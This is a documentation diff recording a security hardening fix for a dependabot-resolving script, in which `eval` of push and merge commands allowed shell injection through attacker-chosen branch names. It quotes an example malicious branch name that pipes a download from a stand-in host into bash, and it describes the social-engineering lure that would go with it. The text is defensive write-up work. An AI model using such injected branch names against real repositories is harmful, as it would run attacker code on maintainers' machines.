@@ -710,6 +710,21 @@ code/config decision — fix the flagged sites, or opt out of the new rules in
 `eslint.config.mjs` and track re-enabling (e.g. #712) — and is out of scope for
 `resolve:dependabot`.
 
+**Hardening (#814): branch guard + no `eval`.** The script takes a PR *number*
+and resolves the head branch via `gh pr view`, so the branch name is
+attacker-controlled. git-refs forbid spaces and `~^:?*[` but **permit** `;`, `|`,
+`&`, `$`, `(`, `)` — and the `--merge` path used to run `eval "$PUSH_CMD"` /
+`eval "$MERGE_CMD"`, so a fork branch like `fix;curl${IFS}evil|bash` plus social
+engineering ("my PR conflicts, run `resolve:dependabot 123 --merge`") executed
+arbitrary shell as the maintainer. CLAUDE.md names this script as the blessed
+agent path, which raises the chance of a run against the wrong PR. Two fixes:
+(1) a `case "$BRANCH" in dependabot/*) ;; *) exit 1` guard right after the branch
+is resolved — before any fetch/checkout — both closing the injection vector and
+refusing a wrong-PR run; (2) the `--merge` path now calls `git push
+--force-with-lease origin "$BRANCH"` and `gh pr merge "$PR" …` directly with
+quoted args instead of `eval`. The `PUSH_CMD`/`MERGE_CMD` variables remain only
+as printed copy-paste hints in the stop-for-review path.
+
 ### Danger JS
 
 `.github/workflows/danger.yml` runs automated PR review checks via `dangerfile.ts`:
